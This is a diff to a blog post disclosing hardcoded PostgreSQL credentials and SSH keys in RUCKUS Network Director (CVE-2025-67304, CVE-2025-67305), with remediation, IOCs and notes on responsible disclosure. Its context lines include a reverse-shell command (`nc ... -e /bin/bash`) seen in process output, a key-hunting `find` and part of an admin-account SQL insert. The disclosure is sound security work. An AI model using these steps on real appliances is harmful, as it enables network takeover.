@@ -2,12 +2,22 @@
 layout: post
 title: "Hardcoded for Your Convenience: RUCKUS Network Director CVE-2025-67304, CVE-2025-67305"
 date: 2026-04-10 17:44 +0200
-description: "RUCKUS Network Director Hardcoded SSH keys and PostgreSQL Credentials"
+description: "Hardcoded PostgreSQL credentials (CVE-2025-67304) and SSH keys (CVE-2025-67305) in RUCKUS Network Director give remote database and shell access. Fixed in 4.5.0.56"
 categories: [Vulnerability Research]
-tags: [Ruckus, CommScope, vulnerability-research, CVE-2025-67304, CVE-2025-67305]
+tags: [RUCKUS, CommScope, vulnerability-research, hardcoded-credentials, CVE-2025-67304, CVE-2025-67305]
+image:
+  path: /assets/img/4/ruckus-network-director-admin-access.webp
+  alt: "Admin access to RUCKUS Network Director via hardcoded credentials"
 ---
 
-# Intro
+> **TL;DR** - Two hardcoded-secret vulnerabilities in RUCKUS Network Director (RND), tested on 4.5.0.52:
+> - **CVE-2025-67304** - hardcoded PostgreSQL credentials, identical on every deployment, giving remote access to the RND database (including web interface user accounts)
+> - **CVE-2025-67305** - hardcoded SSH private key for the `postgres` user, identical on every deployment, giving a remote shell on the appliance
+>
+> **Fixed in:** RUCKUS Network Director 4.5.0.56 (see [IOCs, Remediation and References](#iocs-remediation-and-references)).
+{: .prompt-info }
+
+## Intro
 During a chat I had with business colleagues regarding wireless attacks, someone mentioned they were using an on-premise RUCKUS Networks (CommScope) solution which has features for rogue wireless access point detection. I hate rogue access point detection as it can burn you during red teaming engagements, so I decided to find out what products does Ruckus provide. 
 
 Ruckus SmartZone product family stood out for rogue access point detection features, but reading some product specifications I found out that there is another product named Network Director, that manages the whole fleet of Ruckus devices. Attacking controllers is far more interesting to me due to subsequent systems impact. So, what is RND?
@@ -16,11 +26,11 @@ _The Ruckus Network Director (RND) is application software, which targets an "on
 
 So we are talking about a product designed to scale up to a million access points. Compromise the controller, compromise the network, compromise the fleet. Let's take a look.
 
-# Hardcoded PostgreSQL credentials (CVE-2025-67304)
+## Hardcoded PostgreSQL credentials (CVE-2025-67304)
 
 Ruckus allows you to [download](https://support.ruckuswireless.com/software/4590-ruckus-network-director-4-5-software-release) the Ruckus Network Director Open Virtualization Appliance (OVA). The latest version at the time was 4.5.0.52. OVA is nice as it is easy to load the appliance and poke around it. Setting up the RND appliance was pretty straight forward - basically you set an IP address, change the admin password for the appliance / web interface, configure it as a primary or secondary node and you are good to go. Here is what the web UI looks like (taken from official [documentation](https://support.ruckuswireless.com/documents/4782-ruckus-network-director-user-guide-4-5)):
 
-![Ruckus Network Director](/assets/img/4/ruckus-network-director-web-interface.png)
+![Ruckus Network Director](/assets/img/4/ruckus-network-director-web-interface.webp)
 
 Logging in via the console or SSH does not provide you the usual shell access. Instead, you are provided with a custom-made jail (implemented in `/opt/ruckuswireless/rnd-cli/rnd-cli.jar` if you want to take a look) which only allows you to change the appliances' configuration, revert to factory defaults and other uninteresting stuff, obviously missing a reverse-shell menu item. So, I tried changing the bootloader parameters to drop to a shell with `init=/bin/sh`, but in my case the boot process just hanged and the appliance did not load. As I had the OVA file, I unpacked it and mounted with the `guestmount` utility. 
 
@@ -102,7 +112,7 @@ LIMIT 1;
 ```
 
 Let's confirm that it is possible to login at the admin panel at `https://ruckus:8443` with the newly created `admin2` user.
-![Ruckus Network Director Admin access](/assets/img/4/ruckus-network-director-admin-access.png) 
+![Ruckus Network Director Admin access](/assets/img/4/ruckus-network-director-admin-access.webp) 
 
 With admin access to the Network Director web interface you could:
 - Redirect APs to a malicious SmartZone cluster and MitM the traffic
@@ -148,7 +158,7 @@ postgres 12682 12057  0 20:49 ?        00:00:00 nc 10.0.13.138 4444 -e /bin/bash
 ...
 ```
 
-# Hardcoded SSH keys (CVE-2025-67305)
+## Hardcoded SSH keys (CVE-2025-67305)
 
 Since I already have everything set-up, I decided to try finding some more low-hanging fruit. I believe you would rather see a chain of 6 obscure web vulnerabilities that I cannot even pronounce, but what `find /mnt/rnd/ -type f -name "id_rsa*"` found is just irreplaceable.
 
@@ -176,7 +186,7 @@ ruckus
 
 Same `postgres` user, same superuser database privileges, but now direct SSH access. Just a private key that ships identical across every single deployment. Let's see what else could go wrong.
 
-# Root? Maybe?
+## Root? Maybe?
 
 What I have always found most entertaining in social media posts are over-exaggerations of the vulnerability itself and its impact. 
 
@@ -229,7 +239,7 @@ sshkey --username=postgres "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDvMzXnVJ5g6KVJ
 
 Both vulnerabilities are trivial to exploit. No fuzzing, no reverse engineering, no chaining of obscure primitives. Just a `grep` and a `find`. The point is not the complexity of the attack but the fact that these issues shipped in an enterprise appliance managing wireless infrastructure at scale, with a TODO comment in the codebase acknowledging one of them. Hardcoded credentials and keys are a solved problem. The tooling to detect them exists, the guidance to avoid them exists, and yet here we are.
 
-# IOCs, Remediation and References
+## IOCs, Remediation and References
 
 **Indicators of Compromise**
 - Unexpected admin user accounts in the web interface
@@ -254,7 +264,7 @@ After upgrading, audit the `users` table in the `ruckus` database for unauthoriz
 - **CVE-2025-67304** - [https://nvd.nist.gov/vuln/detail/CVE-2025-67304](https://nvd.nist.gov/vuln/detail/CVE-2025-67304)
 - **CVE-2025-67305** - [https://nvd.nist.gov/vuln/detail/CVE-2025-67305](https://nvd.nist.gov/vuln/detail/CVE-2025-67305)
 
-# Outro
+## Outro
 
 Both issues were responsibly disclosed to CommScope via HackerOne and fixed promptly. Vendor response and cooperation throughout the process was really good - coordinated disclosure works when vendors actually engage. The takeaway is not new: default credentials and hardcoded keys in appliances are a trivially exploitable vulnerability class, and the fact that a TODO comment acknowledging the SSH key issue existed in the codebase makes it particularly avoidable.
 
